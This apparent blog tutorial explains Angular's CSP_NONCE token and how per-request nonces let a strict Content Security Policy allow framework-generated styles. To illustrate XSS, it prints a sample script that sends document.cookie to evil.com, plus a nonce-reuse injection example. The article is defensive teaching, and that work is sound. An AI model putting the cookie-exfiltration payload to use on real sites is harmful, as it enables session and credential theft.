3 min read
2 hours ago

--

CSP_NONCE is one of the most important security features introduced in modern Angular applications (Angular 16+) for applications that use a strict Content Security Policy (CSP).
Press enter or click to view image in full size

Angular_CSP_NONCE_How_It_WorksPress enter or click to view image in full size

CSP_NONCE implementation guide with Angular & Node.jsWhy Angular specifically needs CSP_NONCE
Angular dynamically inserts styles at runtime for:

• Component-scoped styles (ViewEncapsulation.Emulated)

• Lazy-loaded components

• Server-side rendering (SSR) and hydration

• Some Angular CDK features

• Runtime-generated theme or overlay styles
Under a strict CSP, those inline <style> elements would be blocked unless Angular can attach the correct nonce.
When should you use CSP_NONCE?
You should use it when your application enforces a strict Content Security Policy, especially policies such as:
Content-Security-Policy:
default-src 'self';
script-src 'self' 'nonce-{random}';
style-src 'self' 'nonce-{random}';
object-src 'none';
base-uri 'self';Typical scenarios include:

• Banking and financial applications

• Healthcare portals

• Government systems

• Enterprise SaaS products

• Applications with security or compliance requirements (e.g., PCI DSS)

• Any Angular app using strict CSP with SSR or hydration
For small internal applications without a CSP, CSP_NONCE usually isn't necessary.
Complete Request Flow
CSP_NONCE is not a general Angular feature—it exists to let Angular cooperate with a strict Content Security Policy. The backend generates a fresh, unpredictable nonce for every request, includes it in the CSP header and exposes the same value to Angular. Angular then adds that nonce to any runtime-generated inline styles, allowing the browser to trust those styles while continuing to block any injected inline scripts or styles from an attacker. This gives you strong XSS protection without breaking Angular's normal rendering behavior.
Browser
│
│ GET /
▼
Backend
│
│ Generate random nonce
│
▼
Nonce
│
├── CSP Header
│ style-src 'nonce-AbC123'
│
├── HTML
│ <meta name="csp-nonce" content="AbC123">
│
▼
Angular Bootstrap
│
│ provide(CSP_NONCE, "AbC123")
▼
Angular Runtime
│
│ Creates:
│ <style nonce="AbC123">
▼
Browser
│
├── Nonce matches ✔
└── Styles appliedWhat is CSP (Content Security Policy)?
A Content Security Policy is an HTTP response header sent by the server.
Example:
Content-Security-Policy:
default-src 'self';
script-src 'self';
style-src 'self';Its purpose is to prevent attacks like:

• Cross Site Scripting (XSS)

• Script Injection

• Inline JavaScript execution

• Malicious third-party scripts
Without CSP
Imagine someone enters this into a comment box:
<script>
fetch("https://evil.com/steal?cookie="+document.cookie)
</script>If your application accidentally renders it, Browser executes it.
Cookies
JWT
LocalStorage
Session
can all be stolen.
How CSP prevents this?
Suppose server sends
Content-Security-Policy:
script-src 'self';Now browser says
I will execute only JavaScript files coming from this website.
Then this becomes blocked
<script>alert('Hacked')</script>Browser Console
Refused to execute inline script because it violates CSP.Great.
Problem
Modern frameworks like Angular sometimes generate inline styles.
Example
Angular may generate something like
<style>
.ng-star-inserted {
display:block;
}
</style>or hydration related styles. Strict CSP blocks those too.
Browser
Refused to apply inline styleNow Angular UI breaks.
Solution → Nonce
A nonce is
A random one-time cryptographic token.
Example
LJDKH8723JKASD8723KJASDEvery request gets a different nonce.
Server response
Content-Security-Policy:
style-src 'self' 'nonce-LJDKH8723JKASD8723KJASD';Angular receives the same nonce.
Generated style
<style nonce="LJDKH8723JKASD8723KJASD">
...
</style>Browser checks
Nonce matches?
YES
Allow.
Any other inline style without nonce?
Blocked.
Why random every request?
Suppose nonce were fixed.
nonce="abcd123"Attacker learns it.
Then attacker injects
<script nonce="abcd123">
stealCookies()
</script>Browser accepts it.
Security gone.
Therefore
Every request
↓
New nonce
↓
Impossible to predict
Angular CSP_NONCE Token
Angular provides
import { CSP_NONCE } from '@angular/core';You simply inject it. Example :
bootstrapApplication(AppComponent, {
providers: [
{
provide: CSP_NONCE,
useValue: window.__NONCE__
}
]
});Now Angular automatically applies
nonce="..."to dynamically generated styles.
You don’t manually add nonce everywhere.
